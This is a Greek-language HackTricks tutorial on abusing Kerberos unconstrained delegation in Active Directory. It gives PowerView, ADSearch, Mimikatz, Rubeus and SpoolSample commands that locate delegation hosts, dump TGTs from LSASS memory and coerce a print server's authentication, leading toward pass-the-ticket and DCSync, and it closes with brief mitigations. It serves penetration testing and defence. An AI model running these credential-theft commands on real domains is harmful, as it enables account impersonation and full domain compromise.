# Απεριόριστη ανάθεση

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Απεριόριστη ανάθεση

Αυτή είναι μια δυνατότητα που μπορεί να ορίσει ένας Διαχειριστής του Τομέα σε οποιοδήποτε **Υπολογιστή** μέσα στον τομέα. Έπειτα, κάθε φορά που ένας **χρήστης συνδέεται** στον Υπολογιστή, ένα **αντίγραφο του TGT** του χρήστη θα αποστέλλεται μέσα στο TGS που παρέχεται από τον DC **και αποθηκεύεται στη μνήμη του LSASS**. Έτσι, αν έχετε δικαιώματα Διαχειριστή στον υπολογιστή, θα μπορείτε να **αντλήσετε τα εισιτήρια και να προσομοιώσετε τους χρήστες** σε οποιονδήποτε υπολογιστή.

Έτσι, αν ένας διαχειριστής του τομέα συνδέεται σε έναν Υπολογιστή με ενεργοποιημένη τη δυνατότητα "Απεριόριστης ανάθεσης" και έχετε τοπικά δικαιώματα διαχειριστή σε αυτόν τον υπολογιστή, θα μπορείτε να αντλήσετε το εισιτήριο και να προσομοιώσετε τον Διαχειριστή του Τομέα οπουδήποτε (προώθηση προνομίων τομέα).

Μπορείτε να **βρείτε αντικείμενα Υπολογιστή με αυτό το χαρακτηριστικό** ελέγχοντας αν το γνώρισμα [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) περιέχει [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Μπορείτε να το κάνετε αυτό με ένα φίλτρο LDAP της μορφής ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, που είναι αυτό που κάνει το powerview:

<pre class="language-bash"><code class="lang-bash"># Λίστα μη περιορισμένων υπολογιστών
## Powerview
Get-NetComputer -Unconstrained #Οι DC εμφανίζονται πάντα αλλά δεν είναι χρήσιμοι για προνομιοποίηση
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Εξαγωγή εισιτηρίων με το Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Συνιστώμενος τρόπος
kerberos::list /export #Άλλος τρόπος

# Παρακολούθηση συνδέσεων και εξαγωγή νέων εισιτηρίων
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Ελέγξτε κάθε 10 δευτερόλεπτα για νέα TGTs</code></pre>

Φορτώστε το εισιτήριο του Διαχειριστή (ή του θύματος χρήστη) στη μνήμη με το **Mimikatz** ή το **Rubeus για ένα** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Περισσότερες πληροφορίες σχετικά με την απεριόριστη ανάθεση στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Εξαναγκασμός πιστοποίησης**

Αν ένας επιτιθέμενος είναι σε θέση να **διακινδυνεύσει έναν υπολογιστή που επιτρέπεται για "Απεριόριστη ανάθεση"**, μπορεί να **εξαπατήσει** έναν **εκτυπωτικό διακομιστή** να **συνδεθεί αυτόματα** με αυτόν, **αποθηκεύοντας ένα TGT** στη μνήμη του διακομιστή.\
Στη συνέχεια, ο επιτιθέμενος μπορεί να πραγματοποιήσει μια επίθεση **Pass the Ticket για να προσομοιώσει** τον λογαριασμό χρήστη του εκτυπωτικού διακομιστή.

Για να κάνετε έναν εκτυπωτικό διακομιστή να συνδεθεί σε οποιονδήποτε υπολογιστή, μπορείτε να χρησιμοποιήσετε το [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Εάν το TGT είναι από έναν ελεγκτή τομέα, μπορείτε να πραγματοποιήσετε μια επίθεση [**DCSync**](acl-persistence-abuse/#dcsync) και να αποκτήσετε όλες τις κατακερματισμένες τιμές από τον ελεγκτή τομέα.\
[**Περισσότερες πληροφορίες για αυτήν την επίθεση στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Εδώ υπάρχουν και άλλοι τρόποι για να προσπαθήσετε να εξαναγκάσετε μια πιστοποίηση:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Αντιμετώπιση

* Περιορίστε τις συνδέσεις DA/Admin σε συγκεκριμένες υπηρεσίες
* Ορίστε "Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί" για προνομιούχους λογαριασμούς.

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
